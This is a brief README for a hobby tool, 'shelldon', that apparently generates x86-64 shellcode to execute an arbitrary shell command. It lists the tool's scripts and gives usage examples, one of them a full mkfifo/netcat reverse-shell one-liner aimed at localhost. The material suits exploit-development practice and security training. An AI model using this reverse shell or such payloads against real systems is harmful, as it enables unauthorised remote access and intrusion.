# shelldon
generates x86-64 shellcode payloads to basically just execve a shell command

all of the dev happened on a 3 hour flight so "quality" was never the objective

## overview
- shelldone.sh ....... : does the thing (see examples)
- builder.py ......... : writes shellcode.S with command you give
- make_payload.sh .... : compiles shellcode.S into shellcode.bin
- inspet_shellcode.c . : prints shellcode.bin as ctring and hexdump

- test_shellcode.sh .. : tests shellcode.bin, writes runner.c and builds it
- tester.py .......... : writes runner.c from runner.TEMPLATE and shellcode.bin

## examples
### hello world
`./shelldon.sh /bin/echo hello world`

### dumb nc
`./shelldon.sh /bin/nc localhost 1337`

### epic revshell
`./shelldon.sh /bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc localhost 1337 >/tmp/f"`
